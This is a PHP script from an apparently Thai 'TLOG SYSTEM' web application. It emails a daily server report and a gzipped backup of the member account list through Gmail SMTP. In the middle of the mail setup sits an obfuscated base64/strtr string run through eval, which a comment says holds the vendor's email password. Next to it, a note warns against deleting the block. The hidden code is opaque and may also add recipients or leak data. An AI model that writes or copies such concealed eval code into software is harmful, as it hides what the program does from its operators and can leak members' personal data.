 <?php 
  if($HTTP_HOST !="127.0.0.1")
 { exit(); }
 include("../Connections/dbconnect.php");
 $dd=date("d-M-Y");
 $dd2=date("d") ;  $dd2=$dd2-1;
 $dd3=date("m");
 $dd4=date("Y");
 $bkfiles="Tlog_$dd4$dd3$dd2.sql.gz"
 ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
<title>ѧ </title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
}
.style24 {font-family: "MS Sans Serif", Sans-serif, "Microsoft Sans Serif"; font-size: 10; }
.style25 {font-size: 10}
.style27 {font-size: 10; color: #FF0000; }
.style30 {
	font-family: "MS Sans Serif", Sans-serif, "Microsoft Sans Serif";
	font-weight: bold;
}
-->
</style>
</head>

<body>
<?php
 //อ่านไฟล์รายงาน ระบบ
  $msg_text ="<b>รายงานระบบ</b><br>";
 $strFileName = "/tmp/os.txt";
$objFopen = fopen($strFileName, 'r');
if ($objFopen) {
    while (!feof($objFopen)) {
        $file = fgets($objFopen, 4096);
        $msg_text .=$file."<br>";
    }
    fclose($objFopen);
}
 
 
## Please Don't delete it. It will Error.  You can tell me about bug of program this way ##
       require('../PHPMailer/class.phpmailer.php');
       require('../PHPMailer/class.smtp.php');
	   

	   mysql_select_db($database_edoc); //  or trigger_error(mysql_error(),E_USER_ERROR);
$query_Recordset1 = " SELECT  *      FROM  seting        ";
$Recordset1 = mysql_query($query_Recordset1, $connect_db) or die(mysql_error());
$row_Recordset1 = mysql_fetch_assoc($Recordset1);
       $Server_name=$row_Recordset1['tbname'];
       $mailadmin=$row_Recordset1['mailadmin'];
	   $mailstatus=$row_Recordset1['mailstatus'];
	$Server_name=   iconv( 'TIS-620', 'UTF-8', "$Server_name");
	   
	   if($mailstatus !=1){ exit(); }
	   
     $textarea=" รายงานระบบการขายบัตร Server $Server_name  ประจำวันที่  $dd <br> และไฟล์สำรอง ข้อมูลบัญชีรายชื่อของสมาชิก $bkfiles  ";
        $msg ='<table width="800" border="0" align="center">
									  <tr> 
										
    <td height="38" bgcolor="#FF9900"><span class="style1"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif">´</font></strong></span> 
        
      <div align="right"></div></td>
									  </tr>
									  <tr> 
										<td bgcolor="#FFFFCC"> '.$textarea.'</td>
									  </tr>
									  <tr> 
										<td bgcolor="#FFFFCC"><div align="center"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><br>
        <strong>TLOG SYSTEM (www.thaigqsoft.com)</strong> </font></div></td>
									  </tr>
									</table>';
 $msg .=$msg_text;
//#########################################
	   $gmail_user=$row_Recordset1['gmail_user'];
	   $gmail_pass=$row_Recordset1['gmail_pass'];
	   
$mail    = new PHPMailer();
$mail->CharSet = 'utf-8';
$mail->IsSMTP();
$mail->SMTPAuth   = true;                  // enable SMTP authentication
$mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
$mail->Port       = 465;                   // set the SMTP port for the GMAIL server
//.ใช้รหัสผ่านของ Email thaigqsoft ในการส่งเมล  เข้ารหัสไว้เพื่อความปลอดภัย
$_F=__FILE__;$_X='P2lCP1ouWg1WJFllc1ctaSBuTXpIZVlNPlM+Illlc1dYPS5lc3h2bk9BPUB4WWVzV1gyT1kiOw1WJFllc1ctaW1lbm59T3o5PlM+ImEwYVVbVWFmZiI7DVY/aQ1W';$_D=strrev('edoced_46esab');eval($_D('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCdTZ1BPOVlaV0ZLbXF5ZnhjakxKUnp1TTV2TnRzMWIue0I0bkNdaS8yRGwwRWhlQQpbZDg9UXA+VlhvIEh9NkdJdzdrYTNUclU8JywnPVI5b2RtcGxBRVB5azhndls1M3hyTWV6cVpIaTdZaFc8RHNHez5DY1h9MU4vYWZqNl1KdHVTIAouQlVud1ZLTFFPMjBJVEY0YicpOyRfUj1zdHJfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));

//$mail->AddReplyTo("yumiko2523@gmail.com","tanakorn piamsin");
//$mail->From       = "yumiko2523@gmail.com";
//$mail->FromName   = "tanakorn piamsin";

$mail->Subject    = "Report Card Active From $Server_name  $dd  ";
$mail->AltBody    = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
$mail->MsgHTML($msg);
$mail->WordWrap   = 50; // set word wrap
$mail->AddAttachment("/tmp/report.doc","report.doc","base64");
$mail->AddAttachment("/data/log/dblog/$bkfiles","$bkfiles","base64");
 
###################
if($mailadmin !=''){
$mail->AddAddress("$mailadmin", "mailadmin"); 
if(!$mail->Send()) {   print  $mail->ErrorInfo; } else { print "OK";}
}
//#####################################
 ?>
 
</body>
</html>
